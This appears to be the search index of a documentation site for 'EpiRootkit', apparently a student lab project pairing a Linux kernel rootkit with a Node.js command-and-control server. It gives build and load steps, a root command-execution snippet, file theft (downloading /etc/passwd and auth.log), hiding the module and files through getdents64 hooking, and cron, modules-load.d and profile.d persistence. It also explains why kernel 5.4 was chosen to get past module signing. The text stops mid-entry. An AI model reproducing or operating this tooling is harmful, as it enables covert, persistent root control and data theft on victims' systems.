    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


    

    

    index.add(
            {
                id:  0 ,
                href: "\/docs\/01-introduction\/presentation\/",
                title: "Presentation",
                description: "whoami",
                content: "Pr√©sentation linkEquipage link Capitaine: Hugo Sibony Responsable Sabordage et mutinerie: L√©a Bonet Nom de l‚Äô√©quipe linkNous sommes Tux Fan Club üêß\nC‚Äôest L√©a qui a choisi le nom car c‚Äôest la seule personne du groupe un peu cr√©ative üëÄ\n(Et par ce que Hugo est gentleman et a laiss√© le choix a la seule femme du groupe)\nTux est un manchot repr√©sentant le noyau Linux. Il a √©t√© cr√©e en 1996 par Larry Ewing sur GIMP\nVu qu‚Äôil est mignon et que je l‚Äôaime (Tux pas Hugo üëÄ) je me suis dis que Tux Fan Club √©tait un nom convenable\n"
            }
        );
    index.add(
            {
                id:  1 ,
                href: "\/docs\/02-setup\/",
                title: "Setup",
                description: "Environment and Virtual Machine setup instructions",
                content: "Overview linkThis section guides you through setting up your host environment, installing and verifying VM disks, and configuring the attacker and victim VMs.\nInitial Setup \u0026 Installation VM Installation \u0026 Verification Attacking VM Setup Victim VM Setup "
            }
        );
    index.add(
            {
                id:  2 ,
                href: "\/docs\/02-setup\/environment\/",
                title: "Initial Setup \u0026 Installation",
                description: "Prepare your host system from scratch for the EpiRootkit project.",
                content: "Host Environment Setup (from a Blank System) link Assumption: You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.\n1. Update System link sudo apt update \u0026\u0026 sudo apt upgrade -y 2. Install Essential Packages linkInstall all required tools for virtualization, development, and Node.js:\nsudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm Tip: If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use uname -r and apt search linux-headers to check.\n3. (Optional but Recommended) Install pnpm linkpnpm is used for the Web UI. Install it globally:\nsudo npm install -g pnpm 4. Enable and Start libvirt link sudo systemctl enable --now libvirtd 5. Add Your User to the libvirt Group link sudo usermod -aG libvirt $USER # Log out and log back in, or run: newgrp libvirt 6. Verify Virtualization Support linkCheck that KVM modules are loaded:\nlsmod | grep kvm You should see kvm and kvm_intel (or kvm_amd).\nIf not, check if virtualization is enabled in your BIOS:\negrep -c '(vmx|svm)' /proc/cpuinfo # output == 0 -\u003e not activated # output \u003e= 1 -\u003e activated warning If virtualization is not enabled, reboot and enable it in your BIOS/UEFI settings. 7. Verify Node.js, npm, and pnpm link node -v npm -v pnpm -v # (if installed) All should print a version number. If not, check your installation steps above.\n8. Review Helper Scripts link scripts/check_vms.sh: Checks for VM disks and ISO, provides download URLs for missing items. scripts/run_vms.sh: Sets up a NAT network (static200) and launches both VMs. 9. Next Steps link Proceed to "
            }
        );
    index.add(
            {
                id:  3 ,
                href: "\/docs\/02-setup\/vm-installation\/",
                title: "VM Installation \u0026 Verification",
                description: "Set up and verify the attacker and victim VMs from scratch.",
                content: "Virtual Machine Installation \u0026 Verification link You must have completed "
            }
        );
    index.add(
            {
                id:  4 ,
                href: "\/docs\/02-setup\/attacking-vm-setup\/",
                title: "Attacking VM Setup",
                description: "Configure and use the attacking VM",
                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nUsage link Ensure the attacker.qcow2 disk is in the vm/ directory (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification). Launch the attacking VM with: sudo ./scripts/run_vms.sh attacker Or both VMs with: sudo ./scripts/run_vms.sh On the attacking VM: Auto-login is enabled for user attacker (no password prompt). The static IP is 192.168.200.11. The password is jules. For more details on the network configuration and helper scripts, see Initial Setup \u0026 Installation.\n"
            }
        );
    index.add(
            {
                id:  5 ,
                href: "\/docs\/02-setup\/victim-vm-setup\/",
                title: "Victim VM Setup",
                description: "Configure and use the victim VM to load EpiRootkit",
                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nPlace the victim.qcow2 disk in the vm/ directory at the project root (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification).\nLaunch the victim VM with:\nsudo ./scripts/run_vms.sh victim Or both VMs with:\nsudo ./scripts/run_vms.sh On the victim VM:\nThe VM has auto-login enabled for the victim user (no password prompt). Its static IP is 192.168.200.10. The password is jules. When finished, close the QEMU window or use Ctrl+C on the host script to shut down both VMs.\n"
            }
        );
    index.add(
            {
                id:  6 ,
                href: "\/docs\/03-attacking-program\/",
                title: "Attacking Program (C2 Server)",
                description: "The C2 server for EpiRootkit. This section details its overview, installation, usage, configuration, and security aspects.",
                content: "The Attacking Program is the command and control (C2) server for EpiRootkit. It provides a command-line interface (CLI) to manage and interact with EpiRootkit instances on victim machines.\nKey functions include listening for client connections, secure communication (AES-GCM encryption, SHA512 password hashing), client management, and remote command execution via an interactive CLI.\nThis section covers its installation, usage, configuration, and security.\n"
            }
        );
    index.add(
            {
                id:  7 ,
                href: "\/docs\/03-attacking-program\/overview\/",
                title: "README",
                description: "C2 server and attacking program architecture",
                content: "Attacking Program Overview linkProfessional C2 (Command \u0026 Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.\nQuick Start link # Install and start cd attacking_program \u0026\u0026 pnpm install \u0026\u0026 pnpm start # Server started on port 4444 # Web interface: http://localhost:3000 # Basic usage c2-server$ ls # ‚Ä¢ Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM c2-server$ auth Client-1 password # ‚úì Authentication successful Architecture linkCore Components link CLI Interface: Vorpal.js-based interactive commands C2 Server: Node.js TCP server for rootkit communication Web Interface: Basic REST API and Socket.IO dashboard Technology Stack link Runtime: Node.js 18+ with pnpm package manager CLI: Vorpal.js for interactive command interface Server: Express.js with Socket.IO for real-time updates Encryption: Optional XOR cipher for traffic obfuscation (currently disabled on rootkit side) CLI Commands linkClient Management link ls # List connected clients auth # Authenticate with client using dynamic password status # Get client status information config # Interactive configuration menu Operations link exec # Execute shell command upload # Upload file to victim download # Download file from victim Interactive Configuration link c2-server$ config Client-1 # ‚îå‚îÄ Rootkit Configuration - Client-1 # ‚Ä¢ [X] Module Hiding: ENABLED # ‚Ä¢ [X] Persistence: ENABLED # # ? Select option: Toggle Module Hiding # ‚úì Module hiding disabled Available options:\nModule Hiding: Show/hide rootkit from lsmod Persistence: Install/remove boot persistence Status Refresh: Update current configuration Live Demo Session linkConnection \u0026 Authentication link # Start server pnpm start # Load rootkit on victim sudo insmod epirootkit.ko # [C2 shows] New client connected: Client-1 # Authenticate with dynamic password c2-server$ auth Client-1 password # ‚úì Authentication successful Command Execution link c2-server$ exec Client-1 whoami # Exit code: 0 # Output: # root c2-server$ exec Client-1 uname -a # Exit code: 0 # Output: # Linux victim 5.4.0-74-generic #83-Ubuntu... File Operations link c2-server$ upload Client-1 ./test.txt /tmp/test.txt # ‚úì File uploaded successfully (1024 bytes) c2-server$ download Client-1 /etc/passwd ./passwd_copy # ‚úì File downloaded successfully (2048 bytes) Configuration linkServer Settings link # attacking_program/config.env C2_PORT=4444 # C2 server port WEB_PORT=3000 # Web interface port ENABLE_ENCRYPTION=true # Enable XOR encryption (rootkit has it disabled) ENCRYPTION_KEY=MySecretKey123 # Encryption key PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 # SHA-512 hash of \"password\" Authentication linkUses dynamic password authentication where:\nC2 sends plain text password via auth command Rootkit hashes the password using SHA-512 and compares with stored hash Authentication response indicates success/failure Includes rate limiting (5 attempts max) and session timeout (1 hour) Security Features link Dynamic authentication: SHA-512 hashing with brute force protection Optional encryption: XOR cipher for traffic obfuscation (currently mismatched - enabled on C2, disabled on rootkit) Session management: Automatic timeout and cleanup Access control: Commands require authentication Web Interface linkBasic web dashboard available at http://localhost:3000 with:\nREST API for client management Socket.IO for real-time updates Simple client status dashboard Current Configuration Issues link‚ö†Ô∏è Encryption Mismatch: The C2 server has encryption enabled (ENABLE_ENCRYPTION=true) but the rootkit has it disabled (ENABLE_ENCRYPTION 0). This means:\nC2 expects encrypted communication Rootkit sends unencrypted messages Communication works but is unencrypted despite C2 configuration To fix: Either enable encryption in rootkit or disable it in C2 server.\nProvides complete C2 functionality with professional CLI interface and web dashboard for rootkit management.\n"
            }
        );
    index.add(
            {
                id:  8 ,
                href: "\/docs\/03-attacking-program\/commands\/",
                title: "Command Reference",
                description: "Complete reference for all C2 server commands",
                content: "Command Reference linkComplete reference for all C2 server commands with real examples.\nCore Commands link Command Description Authentication Required clients, ls List connected rootkit clients No auth Authenticate with a rootkit client No exec Execute shell commands on target system Yes upload [remoteFile] Upload files from attacking machine to victim system Yes download [localFile] Download files from victim system to attacking machine Yes status Get comprehensive rootkit status Yes keepalive Get detailed keepalive status Yes persist [action] Manage persistence mechanisms Yes config Interactive configuration interface Yes Client Management linkls / clients linkList connected rootkit clients with authentication status and last seen time.\nc2-server$ ls # ‚Ä¢ Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # ‚Ä¢ Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM c2-server$ clients # Same output as 'ls' auth linkAuthenticate with a rootkit client using SHA-512 password verification.\nc2-server$ auth Client-1 password # ‚úì [2025-05-25 16:13:29] Authenticated # SUCCESS: Authentication successful # Wrong password c2-server$ auth Client-1 wrongpass # ERROR: Authentication failed # Rate limiting c2-server$ auth Client-1 wrong1 c2-server$ auth Client-1 wrong2 # ... (after 5 attempts) # ERROR: Rate limited. Try again in 60 seconds Security Features:\nSHA-512 password hashing Rate limiting (5 attempts per 60 seconds) Session timeout (1 hour) Default password: ‚Äúpassword‚Äù Command Execution linkexec linkExecute shell commands on target system with full output capture.\n# Basic commands c2-server$ exec Client-1 whoami # Exit code: 0 # Output: # root c2-server$ exec Client-1 uname -a # Exit code: 0 # Output: # Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux # Complex commands with flags c2-server$ exec Client-1 ps aux | head -10 # Exit code: 0 # Output: # USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND # root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init # ... # File operations c2-server$ exec Client-1 cat /etc/passwd # Exit code: 0 # Output: # root:x:0:0:root:/root:/bin/bash # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin # ... Features:\nRoot privileges execution Stdout/stderr capture with exit codes Max command length: 1024 bytes Max output: 64KB with dynamic allocation Temporary file cleanup File Operations linkupload [remoteFile] linkUpload files from attacking machine to victim system.\n# Upload to specific path c2-server$ upload Client-1 ./test.txt /tmp/test.txt # ‚úì File uploaded successfully (1024 bytes) # Upload to current directory (uses basename) c2-server$ upload Client-1 ./script.sh # ‚úì File uploaded successfully (512 bytes) # Upload configuration file c2-server$ upload Client-1 ./config.conf /etc/myapp/config.conf # ‚úì File uploaded successfully (2048 bytes) download [localFile] linkDownload files from victim system to attacking machine.\n# Download to specific local path c2-server$ download Client-1 /etc/passwd ./victim_passwd # ‚úì File downloaded successfully (2048 bytes) # Download to current directory (uses basename) c2-server$ download Client-1 /etc/hostname # ‚úì File downloaded successfully (64 bytes) # Download log files c2-server$ download Client-1 /var/log/auth.log ./auth.log # ‚úì File downloaded successfully (15360 bytes) Features:\nPath validation and security checks Size limits (10MB maximum) Automatic path resolution Text file support (binary files may be corrupted) System Information linkstatus linkGet comprehensive rootkit status information.\nc2-server$ status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Connection: CONNECTED # Module Hidden: YES # Encryption: DISABLED # Persistence: ENABLED keepalive linkGet detailed keepalive and connection status.\nc2-server$ keepalive Client-1 # Keepalive Status: # Last ping sent: 2025-05-25 16:14:00 # Last pong received: 2025-05-25 16:14:00 # Failed ping count: 0 # Connection stable: YES # Reconnection attempts: 0 # Current state: CONNECTED Persistence Management linkpersist [action] linkManage persistence mechanisms with multiple options.\n# Install all persistence mechanisms c2-server$ persist Client-1 install # SUCCESS: All persistence mechanisms installed # Remove all persistence mechanisms c2-server$ persist Client-1 remove # SUCCESS: All persistence mechanisms removed # Install specific mechanisms c2-server$ persist Client-1 modules # SUCCESS: modules-load.d persistence installed c2-server$ persist Client-1 cron # SUCCESS: Cron persistence installed c2-server$ persist Client-1 profile # SUCCESS: Shell profile persistence installed # Show help c2-server$ persist-help # Persistence Management Commands: # persist install - Install all persistence mechanisms # persist remove - Remove all persistence mechanisms # persist modules - Install modules-load.d persistence # persist cron - Install cron persistence # persist profile - Install shell profile persistence Available Mechanisms:\nmodules-load.d: Systemd automatic loading (/etc/modules-load.d/epirootkit.conf) Cron jobs: Scheduled loading (/etc/cron.d/epirootkit) Shell profiles: Login-based loading (/etc/profile.d/epirootkit.sh) Configuration Management linkconfig linkInteractive configuration interface for rootkit settings.\nc2-server$ config Client-1 # ‚îå‚îÄ Configuration - Client-1 # Current Configuration: # [X] Module Hiding (Click to disable) # [ ] Persistence (Click to enable) # # ? Select option: [Use arrow keys] # ‚ùØ [X] Module Hiding (Click to disable) # [ ] Persistence (Click to enable) # Refresh Status # Exit Available Options:\nModule Hiding: Toggle rootkit visibility in lsmod Persistence: Install/remove boot persistence mechanisms Status Refresh: Update current configuration display Stealth Commands linkDirect Module Control link # Hide module from lsmod c2-server$ hide_module Client-1 # SUCCESS: Module hidden # Unhide module c2-server$ unhide_module Client-1 # SUCCESS: Module visible # Check if hidden c2-server$ exec Client-1 lsmod | grep epirootkit # (no output if hidden) Error Handling linkCommon Errors link # Client not found c2-server$ exec NonExistent whoami # ERROR: Client NonExistent not found # Authentication required c2-server$ exec Client-1 whoami # ERROR: Client not authenticated. Use: auth Client-1 # Rate limiting c2-server$ auth Client-1 wrong_password # ERROR: Rate limited. Try again in 60 seconds # File not found c2-server$ download Client-1 /nonexistent/file # ERROR: File not found or cannot be opened # Command too long c2-server$ exec Client-1 [command \u003e 1024 characters] # ERROR: Command too long Utility Commands linkclear / cls linkClear the terminal screen.\nc2-server$ clear # Screen cleared with header message help linkShow available commands.\nc2-server$ help # EpiRootkit C2 Commands # clients - List connected rootkit clients # auth - Authenticate with client # exec - Execute command on client # upload - Upload file to client # download - Download file from client # status - Get rootkit status # keepalive - Get detailed keepalive status # persist [action] - Manage persistence mechanisms # persist-help - Show persistence usage examples # config - Configure rootkit settings # clear - Clear the screen # exit - Exit C2 server exit / quit linkExit the C2 server gracefully.\nc2-server$ exit # Server Status # [2025-05-25 16:15:00] Shutting down C2 server... Security Considerations link All commands except ls/clients and auth require authentication Commands are logged to kernel log via pr_info() File operations include path validation to prevent directory traversal Rate limiting prevents brute force authentication attacks Session timeouts ensure security even if connections persist Command Parsing linkThe C2 server handles command parsing intelligently:\n# Flags are properly parsed c2-server$ exec Client-1 uname -a # Correctly executes: uname -a # Complex commands work c2-server$ exec Client-1 ps aux | grep ssh # Correctly executes: ps aux | grep ssh # Quotes are handled c2-server$ exec Client-1 echo \"hello world\" # Correctly executes: echo \"hello world\" Complete command reference for efficient rootkit management through the C2 interface.\n"
            }
        );
    index.add(
            {
                id:  9 ,
                href: "\/docs\/04-epirootkit\/",
                title: "EpiRootkit",
                description: "Linux kernel rootkit implementation for kernel 5.4.0",
                content: "EpiRootkit Documentation linkLinux kernel rootkit for Ubuntu 20.04 LTS (kernel 5.4.0).\nQuick Navigation linkGetting Started link "
            }
        );
    index.add(
            {
                id:  10 ,
                href: "\/docs\/04-epirootkit\/overview\/",
                title: "EpiRootkit Overview",
                description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0",
                content: "EpiRootkit linkLinux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).\nWhat We Built linkEpiRootkit is a kernel module that provides:\nC2 Communication: TCP connection to command \u0026 control server Remote Commands: Execute shell commands with output capture File Transfer: Upload/download files between C2 and victim Authentication: SHA-512 password verification with rate limiting Stealth: Hide module from lsmod and hide files from directory listings Persistence: Multiple mechanisms to survive reboots Architecture link C2 Server (Node.js) ‚Üê‚Üí EpiRootkit (Kernel Module) ‚Üê‚Üí Target System Port 4444 Network + Commands Linux Kernel 5.4.0 Quick Demo link # 1. Build and load rootkit cd rootkit \u0026\u0026 make \u0026\u0026 sudo insmod epirootkit.ko # 2. Start C2 server cd attacking_program \u0026\u0026 pnpm start # 3. Use the rootkit c2-server$ auth Client-1 password c2-server$ exec Client-1 whoami c2-server$ status Client-1 Core Components linkNetwork Layer link Connection Management: Persistent TCP connection with auto-reconnect Keepalive System: 60-second ping/pong to detect disconnections Socket Handling: Low-level network operations Command System link Authentication: auth - SHA-512 password verification Execution: exec - Run shell commands with output capture File Operations: upload/download - Transfer files Status: status - Get rootkit information Persistence: persist_* - Install/remove boot persistence Stealth: hide_module/unhide_module - Toggle visibility Stealth Features link Module Hiding: Remove from kernel module list (lsmod) File Hiding: Hide files with specific prefixes from directory listings Syscall Hooking: Uses kretprobe on getdents64 Persistence Mechanisms link modules-load.d: Systemd automatic module loading Cron Jobs: Scheduled module loading Shell Profiles: Load via user login scripts Technical Details link Target: Ubuntu 20.04 LTS with kernel 5.4.0 Language: C (kernel module) + Node.js (C2 server) APIs Used: ftrace, kretprobe, VFS, crypto API Network: TCP on port 4444 (configurable) Authentication: SHA-512 with rate limiting (5 attempts/60s) Configuration linkKey settings in rootkit/core/config.h:\n#define C2_SERVER_IP \"192.168.64.1\" #define C2_SERVER_PORT 4444 #define ENABLE_ENCRYPTION 0 // Currently disabled #define ENABLE_PERSISTENCE 1 // Auto-install persistence #define ENABLE_FILE_HIDING 1 // Hide files with prefixes Documentation Structure link "
            }
        );
    index.add(
            {
                id:  11 ,
                href: "\/docs\/04-epirootkit\/configuration-justifications\/",
                title: "Configuration Justifications",
                description: "Justification for Ubuntu 20.04 LTS / Linux 5.4.x",
                content: " info This page explains why we chose Ubuntu 20.04 LTS with the 5.4.x kernel for our rootkit development and testing. Environment link OS: Ubuntu 20.04 LTS (Focal Fossa) Kernel: 5.4.x (LTS) Why Ubuntu 20.04 LTS? link check_circle Perfect balance between realism and convinience. Widely deployed on servers and desktops Official cloud and container images simplify automation Already uses interesting kernel version (5.4.x) so no need to compile. Why Kernel 5.4.x? link info Balances modern hooking APIs with exported symbols and no mandatory module signing. Full ftrace support\nKernel 4.1+ stabilized the ftrace API (ftrace_set_filter_ip(), register_ftrace_function()). 5.4.x includes every hook we need. Exported kallsyms_lookup_name()\nUp through 5.6 the symbol remains exported. Allows us to resolve sys_call_table at runtime‚Äìno kernel recompilation. Unsigned module loading\nKernels ‚â• 5.7 often enforce module signatures or Secure Boot lockdown. Ubuntu 20.04‚Äôs 5.4.x ships without these restrictions by default. Already compiled in Ubuntu 20.04 LTS\nAs mentionned before Ubuntu 20.04 LTS comes already packing with kernel version 5.4.x making it very easy for us to use and deploy. Alternative Options link Kernel 5.6 Technically we could go until kernel version 5.6 but for practical reasons mentionned above, we went with 5.4.x. Wich in my opinion is still relevant because in LTS. Debian 11 (5.10.x) Still exports our symbols‚Äìrequires disabling module signature checks. warning If we experiment on kernels ‚â• 5.7, we need to append module.sig_enforce=0 to the boot parameters to allow unsigned modules. "
            }
        );
    index.add(
            {
                id:  12 ,
                href: "\/docs\/04-epirootkit\/connection-authentication\/",
                title: "Connection \u0026 Authentication",
                description: "How the rootkit connects to C2 server and authenticates",
                content: "Connection \u0026 Authentication linkHow EpiRootkit connects to the C2 server and handles authentication.\nConnection Process linkAutomatic Connection linkWhen the rootkit loads, it automatically:\nStarts connection thread (epirootkit_conn) Attempts TCP connection to configured C2 server Begins keepalive system (60-second ping/pong) Handles reconnection with exponential backoff Configuration link // rootkit/core/config.h #define C2_SERVER_IP \"192.168.64.1\" #define C2_SERVER_PORT 4444 #define KEEPALIVE_INTERVAL_MS 60000 #define RECONNECT_DELAY_MS 5000 Network Architecture linkThree-Layer System link Connection Management (connection.c) - High-level coordination Keepalive System (keepalive.c) - Health monitoring Socket Management (socket.c) - Low-level network operations Connection States link 0 = DISCONNECTED 1 = CONNECTED 2 = CONNECTING Authentication System linkHow It Works link C2 sends command: auth Client-1 password Rootkit receives: Plain text password Rootkit hashes: Using SHA-512 kernel crypto API Compares hash: Against stored hash in config Returns result: SUCCESS or ERROR Implementation link // Default password is \"password\" (SHA-512 hash stored in config) #define PASSWORD_HASH \"b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86\" Security Features link Rate limiting: 5 attempts per 60 seconds Session timeout: 1 hour automatic expiry Secure hashing: SHA-512 using kernel crypto API Live Demo link1. Start C2 Server link cd attacking_program \u0026\u0026 pnpm start 2. Load Rootkit link sudo insmod epirootkit.ko C2 server shows:\n[2025-05-25 16:13:09] New client connected: Client-1 [2025-05-25 16:13:09] Client-1 status: UNAUTHENTICATED 3. Check Connection link c2-server$ clients # ‚Ä¢ Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM 4. Authenticate link c2-server$ auth Client-1 password # ‚úì [2025-05-25 16:13:29] Authenticated # SUCCESS: Authentication successful 5. Verify Authentication link c2-server$ clients # ‚Ä¢ Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM Keepalive System linkPurpose link Detect disconnections: Network failures, system crashes Maintain connection: Regular ping/pong messages Trigger reconnection: When connection lost How It Works link Ping interval: Every 60 seconds Timeout detection: 30 seconds for response Failure threshold: 3 consecutive failed pings Automatic reconnection: Exponential backoff (5s ‚Üí 10s ‚Üí 20s ‚Üí 40s ‚Üí 60s max) Monitoring link # Check keepalive status from C2 c2-server$ keepalive Client-1 # Keepalive Status: # Last ping sent: 2025-05-25 16:14:00 # Last pong received: 2025-05-25 16:14:00 # Failed ping count: 0 # Connection stable: YES Reconnection Handling linkDisconnection Detection link Socket-level: Immediate network failures Keepalive timeout: No response to ping Send failures: Failed command results Reconnection Process link Detect disconnection Wait with backoff: 5s ‚Üí 10s ‚Üí 20s ‚Üí 40s ‚Üí 60s (max) Attempt reconnection Reset authentication: Must re-authenticate after reconnect Resume operations Protocol Format linkCommands link CMD:: Responses link SUCCESS: ERROR: RESULT: Examples link # Authentication CMD:auth:password SUCCESS: Authentication successful # Command execution CMD:exec:whoami RESULT: Exit code: 0 Output: root # Keepalive CMD:ping: SUCCESS: pong Troubleshooting linkConnection Issues link # Check if C2 server is running netstat -tulpn | grep 4444 # Check rootkit configuration grep C2_SERVER_IP rootkit/core/config.h # Monitor connection attempts dmesg | grep -i epirootkit Authentication Problems link # Rate limiting triggered c2-server$ auth Client-1 wrong_password # ERROR: Rate limited. Try again in 60 seconds # Correct password c2-server$ auth Client-1 password # SUCCESS: Authentication successful Network Debugging link # Test raw connection telnet 192.168.64.1 4444 # Monitor network traffic tcpdump -i any port 4444 Technical Details linkThread Management link Connection thread: epirootkit_conn runs continuously Atomic operations: Thread-safe state management Proper cleanup: Graceful shutdown on module unload Memory Management link Dynamic allocation: kmalloc/kfree for messages Buffer limits: MAX_MESSAGE_SIZE (4096 bytes) No memory leaks: Proper cleanup on errors Error Handling link Graceful failures: Continue operation on network errors Logging: All events logged to kernel log Recovery: Automatic reconnection on all failures Robust connection system with automatic reconnection and secure authentication using SHA-512.\n"
            }
        );
    index.add(
            {
                id:  13 ,
                href: "\/docs\/04-epirootkit\/deployment\/",
                title: "Build \u0026 Deployment",
                description: "How to build and load EpiRootkit on Ubuntu 20.04",
                content: "Build \u0026 Deployment linkHow to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.\nRequirements linkSystem link OS: Ubuntu 20.04 LTS Kernel: 5.4.0-* (check with uname -r) Architecture: x86_64 Dependencies link sudo apt update sudo apt install -y build-essential linux-headers-$(uname -r) Build Process link1. Navigate to Rootkit Directory link cd rootkit 2. Build the Module link make clean \u0026\u0026 make Expected output:\nmake -C /lib/modules/5.4.0-74-generic/build M=/path/to/rootkit modules CC [M] /path/to/rootkit/core/main.o CC [M] /path/to/rootkit/commands/commands.o CC [M] /path/to/rootkit/commands/auth_commands.o CC [M] /path/to/rootkit/commands/exec_commands.o CC [M] /path/to/rootkit/commands/file_commands.o CC [M] /path/to/rootkit/commands/status_commands.o CC [M] /path/to/rootkit/commands/stealth_commands.o CC [M] /path/to/rootkit/network/connection.o CC [M] /path/to/rootkit/network/socket.o CC [M] /path/to/rootkit/network/keepalive.o CC [M] /path/to/rootkit/stealth/stealth.o CC [M] /path/to/rootkit/persistence/persistence.o CC [M] /path/to/rootkit/security/auth.o CC [M] /path/to/rootkit/utils/utils.o LD [M] /path/to/rootkit/epirootkit.ko 3. Verify Build link ls -la epirootkit.ko file epirootkit.ko Should show: ELF 64-bit LSB relocatable, x86-64\nConfiguration linkNetwork Settings linkEdit rootkit/core/config.h before building:\n#define C2_SERVER_IP \"192.168.64.1\" // Your C2 server IP #define C2_SERVER_PORT 4444 // C2 server port Feature Settings link #define ENABLE_ENCRYPTION 0 // Encryption disabled #define ENABLE_PERSISTENCE 1 // Auto-install persistence #define ENABLE_FILE_HIDING 1 // Hide files with prefixes Loading the Module linkLoad Rootkit link sudo insmod epirootkit.ko Verify Loading link # Check if loaded (may be hidden if stealth enabled) lsmod | grep epirootkit # Check kernel messages dmesg | tail -10 Expected kernel messages:\n[ 123.456] EpiRootkit: Starting initialization (v1.0.0) [ 123.457] EpiRootkit: Connection module initialized [ 123.458] EpiRootkit: Stealth module initialized [ 123.459] EpiRootkit: Persistence module initialized [ 123.460] EpiRootkit: All subsystems initialized successfully [ 123.461] EpiRootkit: Attempting connection to 192.168.64.1:4444 Automatic Features linkWhen the module loads, it automatically:\nConnects to C2 server (if running) Installs persistence (modules-load.d, cron, shell profiles) Enables file hiding (hides files with specific prefixes) Starts keepalive system (60-second ping/pong) Module Management linkUnload Module link sudo rmmod epirootkit Remove Persistence link # Remove all persistence mechanisms sudo rm -f /etc/modules-load.d/epirootkit.conf sudo rm -f /etc/cron.d/epirootkit sudo rm -f /etc/profile.d/epirootkit.sh Clean Build link make clean Troubleshooting linkBuild Errors linkMissing headers:\nsudo apt install linux-headers-$(uname -r) Wrong kernel version:\nuname -r # Must be 5.4.0-* Loading Errors linkCheck detailed errors:\ndmesg | grep -i error Module info:\nmodinfo epirootkit.ko Connection Issues linkCheck C2 server:\nnetstat -tulpn | grep 4444 Verify IP configuration:\ngrep C2_SERVER_IP rootkit/core/config.h File Structure linkAfter building, you‚Äôll have:\nrootkit/ ‚îú‚îÄ‚îÄ epirootkit.ko # Main kernel module ‚îú‚îÄ‚îÄ Module.symvers # Symbol versions ‚îú‚îÄ‚îÄ modules.order # Module order ‚îú‚îÄ‚îÄ *.o # Object files ‚îî‚îÄ‚îÄ .*.cmd # Build commands Next Steps link "
            }
        );
    index.add(
            {
                id:  14 ,
                href: "\/docs\/04-epirootkit\/features\/",
                title: "Features",
                description: "EpiRootkit core functionality and capabilities",
                content: "EpiRootkit Features linkCore functionality implemented in the rootkit.\nImplemented Features link"
            }
        );
    index.add(
            {
                id:  15 ,
                href: "\/docs\/04-epirootkit\/features\/command-execution\/",
                title: "Command Execution",
                description: "Execute shell commands remotely with full output capture",
                content: "Command Execution linkExecute shell commands remotely through the rootkit with full output capture.\nHow It Works link C2 sends command: exec Client-1 whoami Rootkit receives: Command string via network Executes command: Using call_usermodehelper() with /bin/sh -c Captures output: Redirects stdout/stderr to temporary file Returns result: Exit code and output back to C2 Implementation Details linkExecution Method link API: call_usermodehelper() (kernel 5.4.0 compatible) Shell: /bin/sh -c \"command\" Privileges: Runs with root privileges Output capture: Temporary files in /tmp/epirootkit_out_* Limits link Command length: 1024 bytes (MAX_COMMAND_LENGTH) Output size: 64KB (MAX_OUTPUT_SIZE) with dynamic allocation Timeout: No timeout (commands run to completion) Usage Examples link # System information c2-server$ exec Client-1 whoami # Exit code: 0 # Output: # root c2-server$ exec Client-1 uname -a # Exit code: 0 # Output: # Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux Technical Implementation linkCommand Processing link // Simplified version of the actual implementation static int handle_exec(const char *data) { char *argv[] = { \"/bin/sh\", \"-c\", command_copy, NULL }; char *envp[] = { \"HOME=/\", \"PATH=/sbin:/bin:/usr/bin:/usr/local/bin\", \"TERM=xterm\", NULL }; // Generate unique temporary filename snprintf(temp_filename, sizeof(temp_filename), \"/tmp/epirootkit_out_%d\", atomic_inc_return(\u0026exec_counter)); // Build command with output redirection snprintf(full_command, command_len + temp_len + 32, \"%s \u003e %s 2\u003e\u00261\", data, temp_filename); // Execute command ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); // Read output from temporary file // ... (file reading logic) return send_result(formatted_result); } Output Capture link Redirection: command \u003e /tmp/epirootkit_out_X 2\u003e\u00261 File reading: kernel_read() to get output Dynamic allocation: vmalloc() for large outputs Cleanup: Automatic temporary file removal Security Considerations linkPrivileges link Root execution: All commands run with kernel-level privileges No sandboxing: Commands have full system access Logging: All commands logged to kernel log via pr_info() Limitations link No interactive commands: Cannot handle commands requiring user input "
            }
        );
    index.add(
            {
                id:  16 ,
                href: "\/docs\/04-epirootkit\/features\/file-transfer\/",
                title: "File Transfer",
                description: "Upload and download files between C2 server and victim system",
